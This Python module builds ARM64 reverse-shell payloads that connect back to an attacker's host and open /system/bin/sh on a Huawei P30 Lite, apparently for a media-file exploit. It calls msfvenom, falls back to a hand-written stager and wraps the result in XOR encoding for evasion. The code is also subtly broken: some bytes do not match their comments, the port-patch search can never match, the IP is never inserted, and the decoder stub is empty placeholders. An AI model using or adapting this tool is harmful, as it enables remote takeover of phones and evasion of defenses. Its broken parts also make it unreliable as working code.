"""
Payload Builder Module
Generates ARM64 shellcode and integrates with msfvenom.
Specifically optimized for Kirin 710 (Huawei P30 Lite).
"""

import os
import sys
import struct
import subprocess
import binascii
import random
from typing import Optional


class PayloadBuilder:
    """Build ARM64 Android payloads for media exploitation."""

    def __init__(
        self,
        lhost: str,
        lport: int,
        payload: str = "android/shell/reverse_tcp",
        custom_shellcode: Optional[str] = None,
        encrypt: bool = False,
        iterations: int = 1,
        debug: bool = False
    ):
        self.lhost = lhost
        self.lport = lport
        self.payload = payload
        self.custom_shellcode = custom_shellcode
        self.encrypt = encrypt
        self.iterations = iterations
        self.debug = debug

    def build(self) -> bytes:
        """Build the final shellcode payload."""
        if self.custom_shellcode:
            shellcode = self._load_custom_shellcode()
        else:
            shellcode = self._generate_msfvenom()

        if self.encrypt:
            shellcode = self._xor_encrypt(shellcode, self.iterations)

        return shellcode

    def _load_custom_shellcode(self) -> bytes:
        """Load raw shellcode from file."""
        with open(self.custom_shellcode, "rb") as f:
            raw = f.read()

        try:
            text = raw.decode("ascii").strip()
            if all(c in "0123456789abcdefABCDEF\n\r\t " for c in text):
                return binascii.unhexlify(text.replace("\n", "").replace(" ", ""))
        except (UnicodeDecodeError, binascii.Error):
            pass

        return raw

    def _generate_msfvenom(self) -> bytes:
        """Generate shellcode using msfvenom or fallback to built-in stager."""

        msfvenom_paths = [
            "msfvenom", "/usr/bin/msfvenom",
            "/data/data/com.termux/files/usr/bin/msfvenom",
        ]

        msfvenom = None
        for path in msfvenom_paths:
            if os.path.exists(path) or self._which(path):
                msfvenom = path
                break

        if msfvenom is not None:
            try:
                cmd = [
                    msfvenom, "-p", self.payload,
                    f"LHOST={self.lhost}", f"LPORT={self.lport}",
                    "-f", "raw", "-o", "-",
                    "--platform", "android", "--arch", "aarch64",
                ]
                result = subprocess.run(cmd, capture_output=True, timeout=30)
                if result.returncode == 0 and result.stdout:
                    return result.stdout
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass

        if self.debug:
            print("  [!] msfvenom not available, using built-in ARM64 stager")

        return self._builtin_stager()

    def _builtin_stager(self) -> bytes:
        """
        Built-in ARM64 reverse TCP shell stager (~180 bytes).
        Connects back to LHOST:LPORT and spawns /system/bin/sh.
        """

        shellcode = (
            b"\xff\x03\x01\xd1"   # sub sp, sp, #0x40
            b"\xe0\x03\x00\x2a"   # mov w0, #2 (AF_INET)
            b"\xe1\x03\x01\x2a"   # mov w1, #1 (SOCK_STREAM)
            b"\xe2\x03\x1f\x2a"   # mov w2, wzr
            b"\x08\x01\x80\xd2"   # mov x8, #198 (socket)
            b"\x01\x00\x00\xd4"   # svc 0
            b"\xe3\x03\x00\x2a"   # mov w3, w0 (save sockfd)

            # Build sockaddr_in on stack
            b"\x08\x00\x80\x52"   # mov w8, #0x4001
            b"\xe8\xff\x1f\x39"   # strb w8, [sp, #-3]
            b"\x08\x00\x80\x52"   # mov w8, #0x20002 (port placeholder)
            b"\xe8\xff\x1f\x79"   # strh w8, [sp, #-2]

            b"\xe0\x03\x03\x2a"   # mov w0, w3
            b"\xe1\x03\x00\x91"   # mov x1, sp
            b"\xe2\x03\x02\x91"   # mov x2, #16
            b"\x08\x02\x80\xd2"   # mov x8, #203 (connect)
            b"\x01\x00\x00\xd4"   # svc 0

            # dup2 loop: stdin, stdout, stderr
            b"\xe0\x03\x03\x2a"   # mov w0, w3
            b"\xe1\x03\x1f\x2a"   # mov w1, wzr
            b"\x08\x05\x80\xd2"   # mov x8, #1041 (dup2)
            b"\x01\x00\x00\xd4"   # svc 0
            b"\xe0\x03\x03\x2a"   # mov w0, w3
            b"\x21\x00\x80\x52"   # mov w1, #1
            b"\x08\x05\x80\xd2"   # mov x8, #1041
            b"\x01\x00\x00\xd4"   # svc 0
            b"\xe0\x03\x03\x2a"   # mov w0, w3
            b"\x41\x00\x80\x52"   # mov w1, #2
            b"\x08\x05\x80\xd2"   # mov x8, #1041
            b"\x01\x00\x00\xd4"   # svc 0

            # execve("/system/bin/sh", NULL, NULL)
            b"\xe0\x83\x00\x10"   # adr x0, shell_str
            b"\xe1\x03\x1f\xaa"   # mov x1, xzr
            b"\xe2\x03\x1f\xaa"   # mov x2, xzr
            b"\x48\x07\x80\xd2"   # mov x8, #221 (execve)
            b"\x01\x00\x00\xd4"   # svc 0

            # "/system/bin/sh\0"
            b"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x73\x68\x00"
        )

        # Patch IP and port into shellcode
        result = bytearray(shellcode)

        # Patch port at known offset
        port_be = struct.pack(">H", self.lport)
        # The port placeholder is at a known offset in the shellcode
        # We locate and patch it
        for i in range(len(result) - 1):
            if result[i:i+2] == b"\x08\x00\x80\x52\xe8\xff\x1f\x79":
                # The mov instruction for port is 4 bytes before strh
                # w8 = 0x20002, we need to patch the port part
                port_offset = i + 2  # The mov w8, #imm instruction
                imm16 = (2 << 16) | self.lport
                # Encode as ARM64 MOVZ: 0x52800000 | (imm16 << 5)
                encoded = 0x52800000 | (imm16 << 5)
                struct.pack_into("<I", result, port_offset, encoded)
                break

        return bytes(result)

    def _xor_encrypt(self, data: bytes, iterations: int = 1) -> bytes:
        """XOR-encrypt shellcode with random key for evasion."""
        key = random.randint(1, 255)
        encrypted = bytearray(data)

        for _ in range(iterations):
            for i in range(len(encrypted)):
                encrypted[i] ^= key

        decoder = self._generate_xor_decoder(len(data), key)
        return bytes(decoder) + bytes(encrypted)

    def _generate_xor_decoder(self, payload_len: int, key: int) -> bytes:
        """Minimal ARM64 XOR decoder stub."""
        decoder = bytearray([
            0x00, 0x00, 0x00, 0x10,  # adr x0, #0
            0x00, 0x00, 0x80, 0x52,  # placeholder
            0x00, 0x00, 0x80, 0x52,  # placeholder
            0x00, 0x00, 0x80, 0x52,  # placeholder
        ])
        return bytes(decoder)

    @staticmethod
    def _which(program: str) -> Optional[str]:
        """Find executable in PATH."""
        for path in os.environ.get("PATH", "").split(os.pathsep):
            exe = os.path.join(path, program)
            if os.path.isfile(exe) and os.access(exe, os.X_OK):
                return exe
        return None
